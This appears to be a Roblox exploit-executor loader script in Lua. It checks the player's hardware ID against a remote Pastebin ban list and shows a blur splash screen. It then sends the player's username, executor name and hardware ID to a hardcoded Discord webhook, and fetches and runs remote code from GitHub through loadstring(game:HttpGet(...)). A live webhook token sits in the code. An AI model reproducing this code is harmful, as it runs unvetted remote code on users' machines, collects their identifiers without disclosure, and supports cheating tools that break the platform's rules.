local url = "https://pastebin.com/raw/dRHx6kNU"

local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local HWIDCheck = loadstring(game:HttpGet(url))()

for i,v in pairs(HWIDCheck) do
    if v == HWID then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GIGIBoxLoader/DAwMJyYkT3s6NGuk/main/BanSand/banlib.lua"))()
	wait(34123123123123)
    end
end


local starting = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")


starting.Name = "starting"
starting.Parent = game.CoreGui
starting.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageLabel.Parent = starting
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.473637849, 0, 0.428696752, 0)
ImageLabel.Size = UDim2.new(0.0520833321, 0, 0.0898980573, 0)
ImageLabel.Image = "rbxassetid://8739538101"

UICorner.Parent = ImageLabel

TextLabel.Parent = starting
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.426445901, 0, 0.518133163, 0)
TextLabel.Size = UDim2.new(0.146305785, 0, 0.0619578697, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Created by Shoulder#1674"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true


----------------------------------------------

local blur = Instance.new("BlurEffect")
blur.Parent = game.Lighting
blur.Size = 0


-------------------------------------------------

ImageLabel.Visible = false
TextLabel.Visible = false

function open()
	blur.Size = 1
	wait(00.1)
	blur.Size = 2
	wait(00.1)
	blur.Size = 3
	wait(00.1)
	blur.Size = 4
	wait(00.1)
	blur.Size = 5
	wait(00.1)
	blur.Size = 6
	wait(00.1)
	blur.Size = 7
	wait(00.1)
	blur.Size = 8
	wait(00.1)
	blur.Size = 9
	wait(00.1)
	blur.Size = 10
	wait(00.1)
	blur.Size = 11
	wait(00.1)
	blur.Size = 12
	wait(00.1)
	blur.Size = 13
	wait(00.1)
	blur.Size = 14
	wait(00.1)
	blur.Size = 15
	wait(00.1)
	blur.Size = 16
	wait(00.1)
	blur.Size = 17
	ImageLabel.Visible = true
	TextLabel.Visible = true
	
end

function close()
	wait(00.1)
	blur.Size = 16
	wait(00.1)
	blur.Size = 15
	wait(00.1)
	blur.Size = 14
	wait(00.1)
	blur.Size = 13
	wait(00.1)
	blur.Size = 12
	wait(00.1)
	blur.Size = 11
	wait(00.1)
	ImageLabel.Visible = false
	TextLabel.Visible = false
	blur.Size = 10
	wait(00.1)
	blur.Size = 9
	wait(00.1)
	blur.Size = 8
	wait(00.1)
	blur.Size = 7
	wait(00.1)
	blur.Size = 6
	wait(00.1)
	blur.Size = 5
	wait(00.1)
	blur.Size = 4
	wait(00.1)
	blur.Size = 3
	wait(00.1)
	blur.Size = 2
	wait(00.1)
	blur.Size = 0
	wait(00.1)

end

---------------------------------------------------
local url2 = "https://raw.githubusercontent.com/GIGIBoxLoader/DAwMJyYkT3s6NGuk/main/started2.js"


open()
wait(5)
		local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

		local webhookcheck =
			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
			secure_load and "Sentinel" or
			KRNL_LOADED and "Krnl" or
			SONA_LOADED and "Sona" or
			"Kid with shit exploit"
		
		local url =
			"https://discord.com/api/webhooks/943184352517431296/w97btgWkVjUQq9WhA1T4uycuw31hXlpUvZLhV4Ch6273TqmpBRTg7vHdqlrbY3SlNR8A"
		local data = {
			["content"] = "Legally got in",
			["embeds"] = {
				{
					["title"] = "**Legally got in**",
					["description"] = "USERNAME: **" .. game.Players.LocalPlayer.Name.."** \nEXPLOIT: **"..webhookcheck.."** \nHWID: **"..HWID.."** \n\nLEGALLY GOT IN : Yes",
					["type"] = "rich",
					["color"] = tonumber(0x7269da),
					["image"] = {
						["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
							tostring(game:GetService("Players").LocalPlayer.Name)
					}
				}
			}
		}
		local newdata = game:GetService("HttpService"):JSONEncode(data)
		
		local headers = {
			["content-type"] = "application/json"
		}
		request = http_request or request or HttpPost or syn.request
		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
		request(abcdef)
close()
loadstring(game:HttpGet(url2))()
